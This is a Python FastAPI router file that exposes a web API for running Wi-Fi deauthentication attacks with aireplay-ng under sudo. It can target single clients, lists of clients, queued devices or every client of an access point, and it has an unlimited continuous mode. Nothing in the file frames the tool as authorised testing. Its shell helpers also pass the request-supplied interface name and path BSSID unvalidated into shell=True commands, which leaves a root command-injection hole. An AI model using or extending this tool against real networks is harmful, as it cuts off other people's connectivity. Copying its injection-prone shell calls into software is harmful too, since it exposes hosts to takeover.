# app/api/deauth.py
from fastapi import APIRouter, Depends, HTTPException, BackgroundTasks
from sqlalchemy.orm import Session
from typing import Optional, List
import subprocess
import time
import re
import threading

from app.db.session import get_db
from app.services.deauth_service import DeauthService
from app.schemas.deauth import (
    DeauthRequest, 
    BulkDeauthRequest, 
    QueueDeauthRequest,
    FlagDeviceRequest, 
    UpdateStatusRequest,
    DeauthStatus
)

router = APIRouter(prefix="/api/deauth", tags=["deauth"])

# Store active deauth processes
active_deauths = {}
deauth_threads = {}

# ============ Helper Functions ============

def run_command(command):
    """Run a shell command and return the output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except Exception as e:
        return "", str(e), 1

def set_interface_channel(interface: str, channel: int):
    """Set the interface to a specific channel."""
    cmd = f"sudo iw dev {interface} set channel {channel}"
    stdout, stderr, rc = run_command(cmd)
    return rc == 0

def validate_mac(mac: str) -> bool:
    """Validate MAC address format."""
    pattern = r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'
    return bool(re.match(pattern, mac))

def get_client_macs(bssid: str, interface: str = "wlan1"):
    """Get connected clients for a BSSID."""
    cmd = f"sudo airodump-ng {interface} --bssid {bssid} -a 2>&1"
    stdout, stderr, rc = run_command(f"timeout 10 {cmd}")
    
    clients = []
    if rc == 0:
        lines = stdout.split('\n')
        in_clients = False
        for line in lines:
            if line.strip() and 'Station' in line or 'BSSID' in line:
                continue
            if 'BSSID' in line:
                in_clients = False
            if in_clients and line.strip():
                parts = line.split()
                if len(parts) >= 1:
                    mac = parts[0]
                    if validate_mac(mac):
                        clients.append(mac)
            if 'BSSID' in line and bssid in line:
                in_clients = True
    
    return clients

def run_deauth_attack(bssid: str, interface: str, channel: int, client_mac: Optional[str], count: int, db: Session):
    """Run the actual deauth attack in background."""
    try:
        print(f"🔍 Starting deauth on {bssid}")
        
        if channel:
            set_interface_channel(interface, channel)
        
        if client_mac:
            cmd = f"sudo aireplay-ng --deauth {count} -c {client_mac} -a {bssid} {interface}"
        else:
            cmd = f"sudo aireplay-ng --deauth {count} -a {bssid} {interface}"
        
        if count == 0:
            process = subprocess.Popen(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                text=True
            )
            
            active_deauths[bssid] = {
                "process": process,
                "interface": interface,
                "channel": channel,
                "client_mac": client_mac,
                "start_time": time.time(),
                "running": True
            }
            
            print(f"✅ Continuous deauth started on {bssid} (PID: {process.pid})")
            
            try:
                service = DeauthService(db)
                service.update_device_status(
                    client_mac=bssid if not client_mac else client_mac,
                    status="deauth_running",
                    notes=f"Deauth attack started on {bssid}"
                )
            except:
                pass
            
        else:
            process = subprocess.run(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            if process.returncode == 0:
                print(f"✅ Deauth completed on {bssid} ({count} packets)")
                if bssid in active_deauths:
                    del active_deauths[bssid]
                
                try:
                    service = DeauthService(db)
                    service.update_device_status(
                        client_mac=bssid if not client_mac else client_mac,
                        status="deauth_completed",
                        notes=f"Deauth completed: {count} packets sent to {bssid}"
                    )
                except:
                    pass
            else:
                print(f"❌ Deauth failed on {bssid}: {process.stderr}")
                if bssid in active_deauths:
                    del active_deauths[bssid]
                    
    except Exception as e:
        print(f"❌ Error in deauth attack: {e}")
        if bssid in active_deauths:
            del active_deauths[bssid]


# ============ Device Management ============

@router.post("/flag")
async def flag_device(
    request: FlagDeviceRequest,
    db: Session = Depends(get_db)
):
    """Flag a device for deauthentication."""
    service = DeauthService(db)
    result = service.flag_device(
        client_mac=request.client_mac,
        reason=request.reason,
        operator=request.operator or "System"
    )
    return result


@router.get("/devices")
async def get_devices(
    status: Optional[str] = None,
    search: Optional[str] = None,
    limit: int = 100,
    offset: int = 0,
    db: Session = Depends(get_db)
):
    """Get all deauth devices."""
    service = DeauthService(db)
    devices = service.get_flagged_devices(
        status=status,
        search=search,
        limit=limit,
        offset=offset
    )
    return {
        "total": len(devices),
        "devices": devices
    }


@router.put("/device/{client_mac}/status")
async def update_device_status(
    client_mac: str,
    request: UpdateStatusRequest,
    db: Session = Depends(get_db)
):
    """Update device status."""
    service = DeauthService(db)
    result = service.update_device_status(
        client_mac=client_mac,
        status=request.status,
        notes=request.notes
    )
    if not result.get("success"):
        raise HTTPException(status_code=404, detail=result.get("error"))
    return result


# ============ Deauth Execution (Enhanced) ============

@router.post("/execute")
async def execute_deauth(
    request: DeauthRequest,
    background_tasks: BackgroundTasks,
    db: Session = Depends(get_db)
):
    """Execute deauth on a device (real-time)."""
    print("=" * 60)
    print("🚀 DEAUTH EXECUTION STARTED")
    print("=" * 60)
    print(f"📡 Client MAC: {request.client_mac}")
    print(f"📡 BSSID: {request.bssid}")
    print(f"📡 Channel: {request.channel}")
    print(f"📡 Count: {request.count}")
    
    if request.client_mac and not validate_mac(request.client_mac):
        raise HTTPException(status_code=400, detail="Invalid client MAC format")
    
    if request.bssid and not validate_mac(request.bssid):
        raise HTTPException(status_code=400, detail="Invalid BSSID format")
    
    if request.bssid and request.bssid in active_deauths:
        raise HTTPException(
            status_code=409,
            detail=f"Deauth attack already running on {request.bssid}"
        )
    
    interface = request.interface or "wlan1"
    
    background_tasks.add_task(
        run_deauth_attack,
        request.bssid,
        interface,
        request.channel or 1,
        request.client_mac,
        request.count or 10,
        db
    )
    
    return {
        "success": True,
        "message": f"Deauth attack started on {request.bssid or request.client_mac}",
        "status": "queued"
    }


@router.post("/bulk-execute")
async def bulk_execute_deauth(
    request: BulkDeauthRequest,
    background_tasks: BackgroundTasks,
    db: Session = Depends(get_db)
):
    """Execute deauth on multiple devices."""
    results = []
    for client_mac in request.client_macs:
        req = DeauthRequest(
            client_mac=client_mac,
            bssid=request.bssid,
            channel=request.channel,
            interface=request.interface,
            reason=request.reason,
            operator=request.operator or "System",
            count=request.count
        )
        
        try:
            background_tasks.add_task(
                run_deauth_attack,
                request.bssid,
                request.interface or "wlan1",
                request.channel or 1,
                client_mac,
                request.count or 10,
                db
            )
            results.append({
                "client_mac": client_mac,
                "success": True,
                "message": "Deauth queued"
            })
        except Exception as e:
            results.append({
                "client_mac": client_mac,
                "success": False,
                "message": str(e)
            })
    
    return {
        "total": len(results),
        "successful": sum(1 for r in results if r["success"]),
        "failed": sum(1 for r in results if not r["success"]),
        "results": results
    }


# ============ Queue Management ============

@router.post("/queue")
async def queue_deauth(
    request: QueueDeauthRequest,
    db: Session = Depends(get_db)
):
    """Queue a deauth request for async processing."""
    service = DeauthService(db)
    result = service.queue_deauth(
        client_mac=request.client_mac,
        reason=request.reason,
        operator=request.operator or "System",
        priority=request.priority
    )
    return result


@router.post("/queue/process")
async def process_queue(
    limit: int = 10,
    background_tasks: BackgroundTasks = None,
    db: Session = Depends(get_db)
):
    """Process pending queue entries."""
    service = DeauthService(db)
    queue_items = service.get_pending_queue(limit=limit)
    
    for item in queue_items:
        if background_tasks:
            background_tasks.add_task(
                run_deauth_attack,
                item.bssid,
                item.interface or "wlan1",
                item.channel or 1,
                item.client_mac,
                item.count or 10,
                db
            )
        service.mark_queue_processed(item.id)
    
    return {
        "processed": len(queue_items),
        "remaining": service.get_queue_count()
    }


# ============ Statistics and Logs ============

@router.get("/stats")
async def get_stats(
    db: Session = Depends(get_db)
):
    """Get deauth statistics."""
    service = DeauthService(db)
    return service.get_stats()


@router.get("/logs")
async def get_logs(
    limit: int = 100,
    offset: int = 0,
    db: Session = Depends(get_db)
):
    """Get deauth logs."""
    service = DeauthService(db)
    logs = service.get_logs(limit=limit, offset=offset)
    return {
        "total": len(logs),
        "logs": logs
    }


# ============ Interface Status ============

@router.get("/interface/status")
async def get_interface_status():
    """Check if the wireless interface is ready for deauth."""
    stdout, stderr, rc = run_command("iwconfig 2>&1")
    
    interfaces = []
    for line in stdout.split('\n'):
        if line and not line.startswith(' '):
            iface = line.split()[0]
            interfaces.append(iface)
    
    stdout, stderr, rc = run_command("iwconfig 2>&1 | grep -i monitor")
    monitor_interfaces = []
    for line in stdout.split('\n'):
        if line and 'Mode:Monitor' in line:
            iface = line.split()[0]
            monitor_interfaces.append(iface)
    
    stdout, stderr, rc = run_command("which aireplay-ng")
    aireplay_installed = rc == 0
    
    return {
        "interfaces": interfaces,
        "monitor_interfaces": monitor_interfaces,
        "aireplay_installed": aireplay_installed,
        "ready": len(monitor_interfaces) > 0 and aireplay_installed,
        "message": "Ready for deauth" if (len(monitor_interfaces) > 0 and aireplay_installed) else "Not ready"
    }


# ============ AP Management ============

@router.get("/aps")
async def get_aps(
    search: Optional[str] = None,
    limit: int = 100,
    offset: int = 0,
    db: Session = Depends(get_db)
):
    """Get list of unique APs from Observations."""
    from app.services.deauth.ap_service import DeauthAPService
    service = DeauthAPService(db)
    return service.get_aps(search=search, limit=limit, offset=offset)


@router.get("/aps/{bssid}/clients")
async def get_ap_clients(
    bssid: str,
    db: Session = Depends(get_db)
):
    """Get all clients connected to a specific AP."""
    from app.services.deauth.ap_service import DeauthAPService
    service = DeauthAPService(db)
    return service.get_ap_clients(bssid)


@router.post("/aps/{bssid}/deauth")
async def deauth_ap(
    bssid: str,
    request: DeauthRequest,
    background_tasks: BackgroundTasks,
    db: Session = Depends(get_db)
):
    """Deauth all clients connected to an AP."""
    from app.services.deauth.ap_service import DeauthAPService
    
    ap_service = DeauthAPService(db)
    clients = ap_service.get_ap_clients(bssid)
    
    if not clients or not clients.get("clients"):
        interface = request.interface or "wlan1"
        client_macs = get_client_macs(bssid, interface)
        
        if not client_macs:
            return {
                "success": False,
                "message": f"No clients found for AP {bssid}",
                "clients_found": 0
            }
        
        for client_mac in client_macs:
            background_tasks.add_task(
                run_deauth_attack,
                bssid,
                interface,
                request.channel or 1,
                client_mac,
                request.count or 10,
                db
            )
        
        return {
            "success": True,
            "message": f"Deauth started on {len(client_macs)} clients of AP {bssid}",
            "clients_found": len(client_macs),
            "clients": client_macs
        }
    
    client_list = clients.get("clients", [])
    if not client_list:
        return {
            "success": False,
            "message": f"No clients found for AP {bssid}",
            "clients_found": 0
        }
    
    interface = request.interface or "wlan1"
    for client in client_list:
        client_mac = client.get("client_mac") or client.get("mac")
        if client_mac:
            background_tasks.add_task(
                run_deauth_attack,
                bssid,
                interface,
                request.channel or 1,
                client_mac,
                request.count or 10,
                db
            )
    
    return {
        "success": True,
        "message": f"Deauth started on {len(client_list)} clients of AP {bssid}",
        "clients_found": len(client_list)
    }


# ============ Stop Deauth ============

@router.post("/stop")
async def stop_deauth(bssid: str):
    """Stop a running deauth attack."""
    print("=" * 60)
    print("⏹️ STOP DEAUTH CALLED")
    print("=" * 60)
    print(f"📡 Target BSSID: {bssid}")
    
    if bssid not in active_deauths:
        raise HTTPException(status_code=404, detail=f"No active deauth attack on {bssid}")
    
    process_info = active_deauths[bssid]
    process = process_info["process"]
    
    try:
        process.terminate()
        time.sleep(1)
        if process.poll() is None:
            process.kill()
        
        print(f"✅ Deauth attack stopped on {bssid}")
        del active_deauths[bssid]
        
        return {
            "success": True,
            "message": f"Deauth attack stopped on {bssid}"
        }
    except Exception as e:
        print(f"❌ Error stopping deauth: {e}")
        raise HTTPException(status_code=500, detail=f"Error stopping deauth: {str(e)}")


@router.get("/active")
async def get_active_deauths():
    """Get all active deauth attacks."""
    status = []
    for bssid, info in active_deauths.items():
        process = info.get("process")
        running = False
        if process:
            process.poll()
            running = process.returncode is None
        
        status.append({
            "bssid": bssid,
            "running": running,
            "interface": info.get("interface"),
            "channel": info.get("channel"),
            "client_mac": info.get("client_mac"),
            "start_time": info.get("start_time"),
            "duration": time.time() - info.get("start_time", time.time()) if info.get("start_time") else 0
        })
    
    return {
        "active_deauths": status,
        "total": len(status)
    }